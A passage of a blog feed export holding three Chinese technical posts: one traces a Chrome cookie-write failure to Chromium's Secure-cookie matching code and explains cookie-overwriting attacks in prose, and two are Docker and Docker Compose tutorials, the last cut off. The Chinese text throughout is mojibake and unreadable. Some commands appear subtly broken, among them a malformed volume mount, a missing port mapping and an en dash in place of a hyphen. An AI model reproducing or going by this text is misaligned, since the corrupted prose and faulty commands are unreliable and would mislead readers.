ä»¥å‰çœ‹éå¾ˆå¤šæ–‡ç« éƒ½æ˜¯æŸ¥å•é¡ŒæŸ¥ä¸€æŸ¥æœ€å¾ŒæŸ¥åˆ° Source code å»ï¼Œçµ‚æ–¼è¼ªåˆ°æˆ‘ä¹Ÿæœ‰é€™ä¸€å¤©äº†ã€‚å¯æ˜¯ Chromium çš„åŸå§‹ç¢¼é€™éº¼ä¸€å¤§åŒ…ï¼Œè©²å¦‚ä½•æ‰¾èµ·å‘¢ï¼Ÿ
æ–¼æ˜¯æˆ‘æ±ºå®šå…ˆ Googleï¼šchromium cookieï¼Œåœ¨ç¬¬ä¸€ç­†æœå°‹çµæœç™¼ç¾äº†å¾ˆæœ‰å¹«åŠ©çš„è³‡æ–™ï¼šCookieMonsterã€‚é€™ç¯‡æ–‡ç« æœ‰è©³ç´°èªªæ˜äº† Chromium çš„ Cookie æ©Ÿåˆ¶æ˜¯æ€éº¼é‹ä½œçš„ï¼Œä¸¦ä¸”èªªæ˜æ ¸å¿ƒå°±æ˜¯ä¸€å€‹å«åš CookieMonster çš„æ±è¥¿ã€‚
å†ä¾†å°±å¯ä»¥ç›´æ¥å»çœ‹ Source code äº†ï¼Œå¯ä»¥åœ¨ /net/cookies æ‰¾åˆ° cookie_monster.ccã€‚
é‚„è¨˜å¾—å‰›å‰›ç™¼ç¾çš„å•é¡Œé‡é»ä¹‹ä¸€ï¼Œæ¨æ¸¬æ˜¯è·ŸSecureé€™å€‹ flag æœ‰é—œï¼Œæ‰€ä»¥ç›´æ¥ç”¨ Secure ç•¶é—œéµå­—ä¸‹å»æœå°‹ï¼Œå¯ä»¥åœ¨ä¸­é–“çš„éƒ¨åˆ†ç™¼ç¾ä¸€å€‹ DeleteAnyEquivalentCookie çš„ functionï¼Œä»¥ä¸‹ç¯€éŒ„éƒ¨åˆ†åŸå§‹ç¢¼ï¼Œ1625 è¡Œåˆ° 1647 è¡Œï¼š
// If the cookie is being set from an insecure scheme, then if a cookie// already exists with the same name and it is Secure, then the cookie// should *not* be updated if they domain-match and ignoring the path// attribute.//// See: https://tools.ietf.org/html/draft-ietf-httpbis-cookie-aloneif (cc-&gt;IsSecure() &amp;&amp; !source_url.SchemeIsCryptographic() &amp;&amp;    ecc.IsEquivalentForSecureCookieMatching(*cc)) &#123;  skipped_secure_cookie = true;  histogram_cookie_delete_equivalent_-&gt;Add(      COOKIE_DELETE_EQUIVALENT_SKIPPING_SECURE);  // If the cookie is equivalent to the new cookie and wouldn&#x27;t have been  // skipped for being HTTP-only, record that it is a skipped secure cookie  // that would have been deleted otherwise.  if (ecc.IsEquivalent(*cc)) &#123;    found_equivalent_cookie = true;    if (!skip_httponly || !cc-&gt;IsHttpOnly()) &#123;      histogram_cookie_delete_equivalent_-&gt;Add(          COOKIE_DELETE_EQUIVALENT_WOULD_HAVE_DELETED);    &#125;  &#125;&#125; 

é€™é‚Šå¾ˆè²¼å¿ƒçš„å¹«ä½ åŠ ä¸Šäº†è¨»é‡‹ï¼Œèªªæ˜¯ï¼š

å¦‚æœæœ‰å€‹ cookie æ˜¯ä¾†è‡ª insecure schemeï¼Œä¸¦ä¸”å·²ç¶“å­˜åœ¨ä¸€å€‹åŒååˆè¨­ç½®ç‚º Secure åˆ domain-match çš„ cookie çš„è©±ï¼Œé€™å€‹ cookie å°±ä¸è©²è¢«è¨­ç½®

é›–ç„¶ä¸å¤ªç†è§£ domain-match æŒ‡çš„åˆ°åº•æ˜¯æ€æ¨£æ‰ç®— matchï¼Œä½†çœ‹ä¾†æˆ‘å€‘ç¢°åˆ°çš„å¯«ä¸é€²å» Cookie çš„å•é¡Œå°±æ˜¯åœ¨é€™ä¸€æ®µç™¼ç”Ÿçš„ã€‚è€Œä¸”é‚„æœ‰è²¼å¿ƒé™„ä¸Šåƒè€ƒè³‡æ–™ï¼šhttps://tools.ietf.org/html/draft-ietf-httpbis-cookie-aloneæ¨™é¡Œç‚ºï¼šã€ŒDeprecate modification of â€˜secureâ€™ cookies from non-secure originsã€ã€‚
å…§å®¹ä¸é•·ï¼Œå¾ˆå¿«å°±å¯ä»¥çœ‹å®Œï¼Œä»¥ä¸‹ç¯€éŒ„å…¶ä¸­ä¸€å°æ®µï¼š
Section 8.5 and Section 8.6 of [RFC6265] spell out some of thedrawbacks of cookies&#x27; implementation: due to historical accident,non-secure origins can set cookies which will be delivered to secureorigins in a manner indistinguishable from cookies set by that originitself.  This enables a number of attacks, which have been recentlyspelled out in some detail in [COOKIE-INTEGRITY].
é™„è¨»ä¸­çš„åƒè€ƒè³‡æ–™æ˜¯é€™å€‹ï¼šCookies Lack Integrity: Real-World Implicationsï¼Œè£¡é¢æœ‰é™„ä¸€æ®µäºŒåå¹¾åˆ†é˜çš„å½±ç‰‡ï¼Œå¯ä»¥çœ‹ä¸€çœ‹ï¼Œçœ‹å®Œä¹‹å¾Œå°±æœƒçŸ¥é“ç‚ºä»€éº¼ä¸èƒ½å¯«å…¥äº†ã€‚
å¦‚æœä½ é‚„æ²’çœ‹ï¼Œé€™é‚Šå¯ä»¥å¹«å¤§å®¶åšä¸€å€‹ç¸½çµã€‚è¦çŸ¥é“ç‚ºä»€éº¼å‰›é–‹å§‹é‚£å€‹ case ä¸èƒ½å¯«å…¥ Cookieï¼Œå¯ä»¥å…ˆæƒ³æƒ³çœ‹å¦‚æœå¯ä»¥å¯«å…¥ï¼Œæœƒç™¼ç”Ÿä»€éº¼äº‹æƒ…ã€‚
å‡å¦‚ http://test.huli.com æˆåŠŸå¯«å…¥ .huli.com çš„ csrftoken é€™å€‹ cookie çš„è©±ï¼Œå° http://test.huli.com ä¼¼ä¹æ²’ä»€éº¼å½±éŸ¿ï¼Œå°±å¤šå¸¶ä¸€å€‹ Cookie ä¸Šå»ï¼Œçœ‹èµ·ä¾†åˆæƒ…åˆç†ã€‚
å¯æ˜¯å‘¢ï¼Œå»å° https://admin.huli.com æœ‰äº›å½±éŸ¿ã€‚
åŸæœ¬ .admin.huli.com ä¸¦ä¸”è¨­ç½®ç‚º Secure çš„ Cookie é‚„æ˜¯æœƒåœ¨ï¼Œä½†ç¾åœ¨å¤šäº†å€‹ .huli.com åˆæ˜¯åŒåçš„ Cookieã€‚ç•¶ https://admin.huli.com é€ request çš„æ™‚å€™ï¼Œå°±æœƒæŠŠé€™å…©å€‹ Cookie ä¸€ä½µå¸¶ä¸Šå»ã€‚æ‰€ä»¥ Server æ”¶åˆ°çš„æ™‚å€™å¯èƒ½æœƒæ˜¯é€™æ¨£ï¼š
csrftoken=cookie_from_test_huli_com; csrftoken=cookie_from_admin_huli_com

ä½†ç¢°åˆ°åŒå Cookie çš„æ™‚å€™ï¼Œå¾ˆå¤šäººéƒ½æœƒåªå–ç¬¬ä¸€å€‹è™•ç†ï¼Œæ‰€ä»¥ Server side æ”¶åˆ°çš„ csrftoken å°±æœƒæ˜¯ cookie_from_test_huli_comã€‚
æ„æ€å°±æ˜¯èªªï¼Œå„˜ç®¡ä½ åœ¨ https://admin.huli.com ç”¨ Secure çš„æ–¹å¼å¯«äº†ä¸€å€‹ Cookieï¼Œå»è¢«å…¶ä»–ä¸å®‰å…¨çš„ä¾†æºï¼ˆhttp://test.huli.comï¼‰çµ¦è¦†è“‹éå»äº†ï¼
é‚£è“‹æ‰ Cookie å¯ä»¥åšä»€éº¼å‘¢ï¼Ÿèˆ‰å¹¾å€‹ä¸Šé¢åƒè€ƒè³‡æ–™çµ¦çš„ä¾‹å­ï¼ˆä½†æˆ‘ä¸ç¢ºå®šæœ‰æ²’æœ‰ç†è§£éŒ¯èª¤ï¼Œæœ‰éŒ¯çš„è©±è«‹æŒ‡æ­£ï¼‰ï¼Œç¬¬ä¸€å€‹æ˜¯ Gmail çš„è¦–çª—ä¸æ˜¯åˆ†æˆå…©éƒ¨åˆ†å—ï¼Œä¸€éƒ¨åˆ†æ˜¯ä¿¡ç®±ï¼Œå¦å¤–ä¸€éƒ¨åˆ†æ˜¯ Hangoutsã€‚æ”»æ“Šè€…å¯ä»¥åˆ©ç”¨ä¸Šé¢è¬›çš„æ‰‹æ³•æŠŠåŸä¾†ä½¿ç”¨è€…çš„ cookie è“‹æ‰ï¼Œæ›æˆè‡ªå·±çš„ session cookieï¼Œå¯æ˜¯å› ç‚º Hangouts è·Ÿ Gmail æœ¬èº«çš„ domain ä¸ä¸€æ¨£ï¼Œæ‰€ä»¥ Gmail é‚„æ˜¯ä½¿ç”¨è€…çš„å¸³è™Ÿï¼ŒHangouts å»å·²ç¶“è®Šæˆæ”»æ“Šè€…çš„å¸³è™Ÿäº†ã€‚
è¢«æ”»æ“Šçš„äººå°±å¾ˆæœ‰å¯èƒ½åœ¨ä¸çŸ¥æƒ…çš„ç‹€æ³ä¸‹åˆ©ç”¨æ”»æ“Šè€…çš„å¸³è™Ÿä¾†ç™¼é€è¨Šæ¯ï¼Œæ”»æ“Šè€…å°±å¯ä»¥çœ‹åˆ°é‚£äº›è¨Šæ¯äº†ã€‚
ç¬¬äºŒå€‹ä¾‹å­æ˜¯æŸé–“éŠ€è¡Œç¶²ç«™ï¼Œå‡å¦‚åœ¨ä½¿ç”¨è€…è¦æ–°å¢ä¿¡ç”¨å¡çš„æ™‚å€™æŠŠ session cookie æ›æˆæ”»æ“Šè€…çš„ï¼Œé‚£é€™å¼µä¿¡ç”¨å¡å°±æ–°å¢åˆ°æ”»æ“Šè€…çš„å¸³æˆ¶å»äº†ï¼
å¤§æ¦‚å°±æ˜¯é€™æ¨£ï¼Œç¸½ä¹‹éƒ½æ˜¯é€éæŠŠåŸæœ¬çš„ cookie é®è”½ä½ï¼Œè®“ server side ä½¿ç”¨æ–°çš„ cookie çš„æ”»æ“Šæ–¹æ³•ã€‚
ç¸½çµæˆ‘ä¸€é–‹å§‹ç¢°åˆ°é€™å€‹å•é¡Œçš„æ™‚å€™çœŸçš„æ»¿è‹¦æƒ±çš„ï¼Œå› ç‚ºæ€éº¼æƒ³éƒ½æƒ³ä¸åˆ°ç‚ºä»€éº¼ä¸€å€‹èªæ³•å®Œå…¨æ²’éŒ¯çš„æŒ‡ä»¤æ²’è¾¦æ³•å¯«å…¥ Cookieï¼Œè€Œä¸”https://admin.huli.comé€™å€‹ç¶²ç«™æˆ‘å¹³å¸¸ä¹Ÿå¾ˆå°‘ç”¨åˆ°ï¼Œæ ¹æœ¬ä¸æœƒæƒ³åˆ°æ˜¯å®ƒçš„å•é¡Œã€‚
ä½†é€™æ¬¡æŠŠå•é¡Œè§£æ‰ä¹‹å¾Œé‡æ–°å›ä¾†çœ‹ï¼Œå…¶å¯¦éç¨‹ä¸­å°±æœ‰ä¸€äº›è››çµ²é¦¬è·¡å¯å¾ªï¼Œä¾‹å¦‚èªªå¯ä»¥é€éã€Œæ¸…æ‰ Cookie å°±æ²’äº‹ã€é€™é»å¾—çŸ¥æ‡‰è©²æ˜¯è·Ÿå…¶ä»– Cookie æœ‰å¹²æ“¾ï¼Œä¹Ÿå¯ä»¥å¾åˆ¥çš„ç€è¦½å™¨å¯ä»¥å¯«å…¥é€™é»å¾—çŸ¥æ‡‰è©²æ˜¯ Chrome çš„ä¸€äº›æ©Ÿåˆ¶ã€‚
éç¨‹ä¸­çš„æ¯å€‹ç·šç´¢éƒ½æœƒå¸¶ä½ æ‰¾åˆ°æ–°çš„è·¯ï¼Œåªè¦å …æŒèµ°ä¸‹å»ï¼Œä¸€å®šèƒ½æˆåŠŸé—–å‡ºè¿·å®®ã€‚
é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>cookie</tag>
      </tags>
  </entry>
  <entry>
    <title>ä½¿ç”¨ Docker å»ºç«‹ nginx ä¼ºæœå™¨å…¥é–€æ•™å­¸</title>
    <url>/2018/03/17/docker-build-nginx-tutorial/</url>
    <content><![CDATA[
å‰è¨€ç›¸ä¿¡ä¸€èˆ¬é–‹ç™¼è€…æ¯æ¬¡é–‹ç™¼æ‡‰ç”¨ç¨‹å¼æ™‚æœ€è¨å­çš„å°±æ˜¯è¨­å®šç’°å¢ƒã€‚å¾€å¾€è£å¥½ç’°å¢ƒæ™‚é–‹ç™¼æ‡‰ç”¨çš„ç†±æƒ…å¾€å¾€è¢«æ¶ˆç£¨ä¸€åŠï¼Œä¸éå¦‚ä»Šæœ‰äº† Docker ä¸ä½†å¯ä»¥æé«˜é–‹ç™¼æ•ˆç‡ä¹Ÿå¯ä»¥æ›´å®¹æ˜“ç®¡ç†æ•´å€‹æœå‹™æ¶æ§‹ï¼Œç™¼å±• micro serviceï¼
Docker åŸºæœ¬æ¦‚å¿µDocker å’Œå‚³çµ±åœ¨ç¡¬é«”åšè™›æ“¬åŒ–çš„æ–¹å¼ä¸åŒï¼Œå…¶ä¸»è¦åœ¨ä½œæ¥­ç³»çµ±å±¤åšè™›æ“¬åŒ–ä¸”åœ¨ä¸»æµçš„ä½œæ¥­ç³»çµ±å’Œé›²ç«¯å¹³å°ä¸Šéƒ½å¯ä»¥ä½¿ç”¨ï¼ˆä¾‹å¦‚ï¼šLinuxã€MacOS å’Œ Windowsï¼‰ï¼Œä¸åŒä½œæ¥­ç³»çµ± Docker ç›¸é—œå®‰è£æ–¹å¼å¯ä»¥åƒè€ƒå®˜æ–¹ç¶²ç«™ã€‚

é—œæ–¼ Docker åŸºæœ¬æœ‰ä¸‰å¤§ä¸»è»¸æ¦‚å¿µï¼š

Docker æ˜ åƒæª”ï¼ˆImageï¼‰ï¼šé¡ä¼¼æ–¼è™›æ“¬æ©Ÿçš„æ˜ åƒæª”ï¼Œæ˜¯ä¸€å€‹å¯ä»¥å‰µå»ºå®¹å™¨çš„æ¨¡ç‰ˆï¼ˆtemplateï¼‰
Docker å®¹å™¨ï¼ˆContainerï¼‰ï¼šé¡ä¼¼æ–¼ä¸€å€‹è¼•é‡ç´š sandboxã€‚Docker æ˜¯é€éå®¹å™¨ä¾†é‹è¡Œä¸¦éš”é›¢æ‡‰ç”¨
Docker å€‰åº«ï¼ˆRepositoryï¼‰ï¼šé¡ä¼¼æ–¼ç¨‹å¼ç¢¼å„²å­˜åœ°ï¼Œå¯ä»¥æƒ³æˆæ˜¯ Docker ç‰ˆçš„ git repoã€‚è€Œ Docker Hub é¡ä¼¼æ–¼ Docker ç‰ˆçš„ Gihubï¼Œæœ‰è¨±å¤š repo åœ¨ä¸Šé¢åˆ†äº«

ä½¿ç”¨ Docker å»ºç«‹ Nginx ä¼ºæœå™¨

ä½¿ç”¨å®˜æ–¹ nginx image é‹è¡Œ docker container
 å°‡ nginx image è·‘èµ·ä¾†æˆç‚ºä¸€å€‹ webserver containerï¼Œä¸¦æŠŠ docker container 80 port å°æ‡‰åˆ°æœ¬æ©Ÿç«¯çš„ 0.0.0.0:7777
 $ docker run -d -p 7777:80 --name webserver nginx

 è‹¥æœ¬åœ°ç«¯æ²’æœ‰ image å‰‡æœƒå¾é ç«¯ä¸‹è¼‰ï¼š Unable to find image â€˜nginx:latestâ€™ locally latest: Pulling from library&#x2F;nginx

æª¢æŸ¥ Docker container æ˜¯å¦é‹è¡Œï¼ˆæœ‰å¯èƒ½éœ€è¦ sudo æ¬Šé™ï¼‰
 $ docker ps

 æ­¤æ™‚åœ¨ç€è¦½å™¨ http://localhost:7777 æ‡‰è©²å¯ä»¥çœ‹åˆ° nginx ä¼ºæœå™¨çš„é¦–é 

æ›¿æ› nginx é¦–é 
 åœ¨ç›®å‰è³‡æ–™å¤¾å»ºç«‹ä¸€å€‹ index.html æª”æ¡ˆï¼š
 &lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;    &lt;head&gt;        &lt;title&gt;&lt;/title&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;h1&gt;Hi Nginx Docker&lt;/h1&gt;    &lt;/body&gt;&lt;/html&gt;

 è¨˜å¾—æŠŠä¹‹å‰çš„ docker container å…ˆ docker stop webserver æš«åœç„¶å¾Œè¼¸å…¥ï¼š
 ï¼ˆè‹¥é‡åˆ°å·²ç¶“å‰µå»ºåŒæ¨£åç¨± container æ™‚å¯ä»¥å…ˆè¼¸å…¥ docker stop CONTAINER_NAMESï¼‰ å¾Œ docker rm CONTAINER_NAMESï¼‰
 $ docker run --name nginx-container -p 7777:80 -v index.html:/usr/share/nginx/html:ro -d nginx

 æ­¤æ™‚åœ¨ç€è¦½å™¨ http://localhost:7777 å³å¯ä»¥çœ‹åˆ° nginx ä¼ºæœå™¨çš„é¦–é è¢«æ›æˆæˆ‘å€‘ index.html å…§å®¹

ä½¿ç”¨ Dockerfile å»ºç«‹æ–°çš„æ˜ åƒæª”ï¼š
 FROM nginxCOPY ./index.html /usr/share/nginx/html

 é–‹å§‹æ ¹æ“šç›®éŒ„ä¸‹ Dockerfile å»ºç«‹æ˜ åƒæª”
 $ docker build . -t my-nginx-image

 æˆåŠŸå¾Œå¯ä»¥åŸ·è¡Œ run å‹•ä½œï¼Œä½†è¨˜å¾—æŠŠä¹‹å‰çš„ docker container å…ˆ stop æš«åœ
 $ docker stop webserver

 åŸ·è¡Œ docker run é€éæˆ‘å€‘å‰›å»ºç«‹çš„ my-nginx-imag ä¾†å»ºç«‹ container
 $ docker run --name nginx-container -d my-nginx-image

 æ­¤æ™‚åœ¨ç€è¦½å™¨ http://localhost:7777 æ‡‰è©²åˆå¯ä»¥çœ‹åˆ° nginx ä¼ºæœå™¨çš„é¦–é è¢«æ›æˆæˆ‘å€‘ index.html å…§å®¹


ç¸½çµä»¥ä¸Šå°±æ˜¯ç°¡å–®çš„ä½¿ç”¨ Docker å»ºç«‹ nginx ä¼ºæœå™¨å…¥é–€æ•™å­¸ï¼Œäº‹å¯¦ä¸Š docker åŠŸèƒ½é‚„æœ‰å¤šæœ‰è¶£çš„æ‡‰ç”¨ï¼Œç¶²è·¯ä¸Šä¹Ÿæœ‰è¨±å¤šå·²ç¶“æ‰“åŒ…å¥½çš„ image æª”æ¡ˆç­‰è‘—ç™¼æ˜ã€‚å°äº†ï¼Œè‡ªå¾æœ‰äº† docker ä¹‹å¾Œä¸ä½†å¯ä»¥æ—©é»ä¸‹ç­ï¼Œæå£ç’°å¢ƒä¹Ÿä¸ç”¨æ€•ï¼
åƒè€ƒæ–‡ä»¶
Docker åŸºæœ¬è§€å¿µèˆ‡ä½¿ç”¨æ•™å­¸ï¼šè‡ªè¡Œå»ºç«‹ Docker å½±åƒæª”
twtrubiks&#x2F;docker-tutorial
æ•™ä½ ä¸€æ¬¡å­¸æœƒå®‰è£ Docker é–‹å§‹ç©è½‰ Container å®¹å™¨ä¸–ç•Œ
Docker â€”â€” å¾å…¥é–€åˆ°å¯¦è¸

ï¼ˆimage via logzï¼‰
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>nginx</tag>
        <tag>docker</tag>
        <tag>server</tag>
        <tag>container</tag>
        <tag>apache</tag>
        <tag>iamge</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker Compose å»ºç½® Web service èµ·æ­¥èµ°å…¥é–€æ•™å­¸</title>
    <url>/2018/09/07/docker-compose-tutorial-intro/</url>
    <content><![CDATA[
å‰è¨€èº«ç‚ºä¸€å€‹é–‹ç™¼è€…æœ€æƒ±äººçš„è«éæ–¼ç’°å¢ƒå»ºç½®å’Œéƒ¨å±¬æ‡‰ç”¨ç¨‹å¼ã€‚éš¨è‘— Docker å®¹å™¨å’Œè™›æ“¬åŒ–æŠ€è¡“é€²æ­¥ä»¥åŠ DevOpsã€Infrastructure as Code æ–‡åŒ–çš„æ¨å»£ï¼Œè®“æˆ‘å€‘å¯ä»¥æ›´å®¹æ˜“åœ¨ä¸åŒç’°å¢ƒé–‹ç™¼éƒ¨å±¬ä¸¦èª¿åº¦ï¼ˆOrchestrationï¼‰æˆ‘å€‘çš„å°ˆæ¡ˆæ‡‰ç”¨ç¨‹å¼ã€‚åœ¨ Docker ä¸­ï¼Œé™¤äº† Docker æŒ‡ä»¤å’Œ Docker Engine èƒŒå¾Œçš„æŠ€è¡“å¤–ï¼Œæœ€é‡è¦çš„è«éæ–¼ Docker Machineã€Docker Compose å’Œ Docker Swarm ä¸‰åŠå®¢äº†ã€‚æ¥ä¸‹ä¾†æˆ‘å€‘å°‡é€é Docker Compose ä¾†å•Ÿå‹•ä¸¦åŸ·è¡Œ Python Flask + Redis ç¶²é äººæ•¸çµ±è¨ˆçš„å°ˆæ¡ˆï¼Œè®“è®€è€…èƒ½å¤ ç†è§£ Docker Compose çš„å„ªå‹¢å’Œä½¿ç”¨æ–¹å¼ã€‚é‚£å°±è®“æˆ‘å€‘é–‹å§‹å§ï¼

Docker Compose ç°¡ä»‹ä¸€é–‹å§‹æˆ‘å€‘å…ˆäº†è§£ Docker Compose æ˜¯ä¸€å€‹å·¥å…·å¯ä»¥è®“ä½ å¯ä»¥é€éä¸€å€‹æŒ‡ä»¤å°±å¯ä»¥æ§åˆ¶æ‰€æœ‰å°ˆæ¡ˆï¼ˆprojectï¼‰ä¸­æ‰€éœ€è¦çš„ servicesã€‚Docker Compose æ˜¯ç”¨ YAML æª”æ¡ˆæ ¼å¼ä¾†æè¿°å’Œå®šç¾© project ä¸­ services é‹ä½œé—œä¿‚ï¼Œç™½è©±ä¾†èªªå°±æ˜¯ç”¨ä¾†ç®¡ç† Container çš„æ–‡ä»¶æª”ã€‚
ä»€éº¼æ„æ€å‘¢ï¼Ÿ
è©¦æƒ³ä¸€ä¸‹ï¼Œæˆ‘å€‘åœ¨é–‹ç™¼ä¸€å€‹å…¸å‹çš„ Web project æ™‚é€šå¸¸ä¸æ˜¯åªæœ‰ä¸€å€‹ serviceï¼Œæœ‰å¯èƒ½éœ€è¦ app serverã€databaseã€cacheï¼Œç”šè‡³æ˜¯ reverse proxy ç­‰ service æ‰èƒ½æ§‹æˆä¸€å€‹å¯ä»¥ä¸Šç·šé‹è¡Œçš„å°ˆæ¡ˆï¼Œé€™äº› service å¾€å¾€æœƒéœ€è¦å¤šå€‹ container ä¾†é‹è¡Œã€‚æ­¤æ™‚è‹¥æ˜¯ä½¿ç”¨ Docker CLI éœ€è¦æ‰‹å‹•è¼¸å…¥å¤šå°‘è¡Œæ‰èƒ½æ­£å¼å•Ÿå‹•ä¸€å€‹ projectï¼Ÿé€™æ™‚å€™å°±æ˜¯ Docker Compose ç™¼æ®åŠŸèƒ½çš„æ™‚å€™å•¦ï¼
æˆ‘å€‘å…ˆä¾†çœ‹çœ‹ï¼Œä¸€å€‹åŸºæœ¬çš„ docker-compose.yml æª”æ¡ˆé•·é€™æ¨£ï¼ˆYAML æª”æ¡ˆæ ¼å¼ï¼Œä½¿ç”¨ç©ºæ ¼ä¾†ç¸®æ’ï¼Œé™„æª”åç‚º .ymlï¼‰ï¼š
version: &#x27;3&#x27; # ç›®å‰ä½¿ç”¨çš„ç‰ˆæœ¬ï¼Œå¯ä»¥åƒè€ƒå®˜ç¶²ï¼šservices: # services é—œéµå­—å¾Œé¢åˆ—å‡º web, redis å…©é …å°ˆæ¡ˆä¸­çš„æœå‹™  web:    build: . # Build åœ¨åŒä¸€è³‡æ–™å¤¾çš„ Dockerfileï¼ˆæè¿° Image è¦çµ„æˆçš„ yaml æª”æ¡ˆï¼‰æˆ container    ports:      - &quot;5000:5000&quot; # å¤–éƒ¨éœ²å‡ºé–‹æ”¾çš„ port å°æ‡‰åˆ° docker container çš„ port    volumes:      - .:/code # è¦å¾æœ¬åœ°è³‡æ–™å¤¾ mount æ›è¼‰é€²å»çš„è³‡æ–™    links:      - redis # é€£çµåˆ° redisï¼Œè®“å…©å€‹ container å¯ä»¥äº’é€šç¶²è·¯  redis:    image: redis # å¾ redis image build å‡º container

Dockerfile å’Œ Docker Compose çš„å·®ç•°æ˜¯ï¼Ÿåœ¨äº†è§£åˆ° Docker Compose ä¸»è¦æ˜¯ç”¨ä¾†æè¿° Service ä¹‹é–“çš„ç›¸ä¾æ€§å’Œèª¿åº¦æ–¹å¼å¾Œï¼Œæˆ‘å€‘ä¾†çœ‹çœ‹åŒæ¨£åˆå­¸è€…æœƒæ¯”è¼ƒå®¹æ˜“ææ··çš„è§€å¿µï¼šDockerfileã€‚äº‹å¯¦ä¸Š Dockerfile æ˜¯ç”¨ä¾†æè¿°æ˜ åƒæª”ï¼ˆimageï¼‰çš„æ–‡ä»¶ã€‚
æ‰€è¬‚çš„ Imageï¼Œå°±æ˜¯ç”Ÿç”¢ Container çš„æ¨¡ç‰ˆï¼Œä½ å¯ä»¥å¾ Docker Hub å®˜æ–¹ä¸‹è¼‰æˆ–æ˜¯æ ¹æ“šå®˜æ–¹çš„ Image è‡ªå·±åŠ å·¥å¾Œæ‰“åŒ…æˆ Image æˆ–æ˜¯å®Œå…¨è‡ªå·±ä½¿ç”¨ Dockerfile æè¿° Image å…§å®¹ä¾†è£½ä½œ Imageã€‚è€Œ Container å‰‡æ˜¯é€é Image ç”¢ç”Ÿéš”é›¢çš„åŸ·è¡Œç’°å¢ƒï¼Œç¨±ä¹‹ç‚º Containerï¼Œä¹Ÿå°±æ˜¯æˆ‘å€‘ä¸€èˆ¬ç”¨ä¾†æä¾› microservice çš„æœ€å°å–®ä½ã€‚
# é€™æ˜¯ä¸€å€‹å‰µå»º ubuntu ä¸¦å®‰è£ nginx çš„ imageFROM ubuntu:16.04 # å¾ Docker hub ä¸‹è¼‰åŸºç¤çš„ imageï¼Œå¯èƒ½æ˜¯ä½œæ¥­ç³»çµ±ç’°å¢ƒæˆ–æ˜¯ç¨‹å¼èªè¨€ç’°å¢ƒï¼Œé€™é‚Šæ˜¯ ubuntu 16.04MAINTAINER demo@gmail.com # ç¶­è­·è€…RUN apt-get update # åŸ·è¡Œ CMD æŒ‡ä»¤è·‘çš„æŒ‡ä»¤ï¼Œæ›´æ–° apt å¥—ä»¶åŒ…è³‡è¨ŠRUN apt-get install â€“y nginx # åŸ·è¡Œ CMD æŒ‡ä»¤è·‘çš„æŒ‡ä»¤ï¼Œå®‰è£ nginxCMD [&quot;echo&quot;, &quot;Nginx Image created&quot;] 

ä»¥ä¸Šç‚ºç°¡å–®çš„ Dockerfileã€‚æˆ‘å€‘å¯ä»¥çœ‹åˆ°ï¼Œåªéœ€ä¸€å€‹æ–‡å­—æª”ï¼Œå°±æ¸…æ¥šæè¿°ä¸€å€‹ Docker imageã€‚åˆ©æ–¼ä½¿ç”¨ç‰ˆæœ¬æ§åˆ¶ï¼Œä¹Ÿå¯ä»¥æ¸›å°‘ shell script çš„å·¥ä½œé‡ã€‚
é€é Docker å»ºç«‹ Python Pageview Appåœ¨å»ºç«‹äº† Dockerfile å’Œ Docker Compose çš„åŸºç¤è§€å¿µå¾Œï¼Œæˆ‘å€‘ä¾†é€éä¸€å€‹ç°¡å–® Python Flask + Redis ç¶²é äººæ•¸çµ±è¨ˆçš„å°ˆæ¡ˆè®“è®€è€…å¯ä»¥æ›´æ·±åˆ»ç†è§£ Docker Compose çš„å¨åŠ›ã€‚
ç’°å¢ƒæº–å‚™ï¼šLniux&#x2F;MacOS ç‚ºä¸»å¯ä»¥è¼¸å…¥æŒ‡ä»¤çš„çµ‚ç«¯æ©Ÿï¼ˆè‹¥ç‚º windows å¯ä»¥ä½¿ç”¨ cmderï¼‰åˆ°å®˜ç¶²å®‰è£ DockeråŸºæœ¬ Docker å’Œ Web çŸ¥è­˜

å‰µå»ºå°ˆæ¡ˆè³‡æ–™å¤¾
$ mkdir docker-compose-python-flask-redis-counter$ cd docker-compose-python-flask-redis-counter

åœ¨è³‡æ–™å¤¾ä¸‹å»ºç«‹ app.py ç•¶åš web app é€²å…¥é»ï¼Œè£¡é¢æœ‰ flask å’Œ redis æ“ä½œï¼Œç•¶ä½¿ç”¨è€…ç€è¦½é¦–é æ™‚ï¼Œredis æœƒè¨˜éŒ„æ¬¡æ•¸ï¼Œè‹¥æœ‰ exception å‰‡æœ‰ retry æ©Ÿåˆ¶
 import timeimport redisfrom flask import Flaskapp = Flask(__name__)cache = redis.Redis(host=&#x27;redis&#x27;, port=6379)def get_hit_count():    retries = 5    while True:        try:            return cache.incr(&#x27;hits&#x27;)        except redis.exceptions.ConnectionError as exc:            if retries == 0:                raise exc            retries -= 1            time.sleep(0.5)@app.route(&#x27;/&#x27;)def get_index():    count = get_hit_count()    return &#x27;Yo! ä½ æ˜¯ç¬¬ &#123;&#125; æ¬¡ç€è¦½\n&#x27;.format(count)if __name__ == &quot;__main__&quot;:    app.run(host=&quot;0.0.0.0&quot;, debug=True)

å»ºç«‹å¥—ä»¶ requirements.txt å®‰è£è³‡è¨Šè®“ Dockerfile å¯ä»¥ä¸‹æŒ‡ä»¤å®‰è£å¥—ä»¶
 flaskredis

å»ºç«‹ Web App çš„ Dockerfile
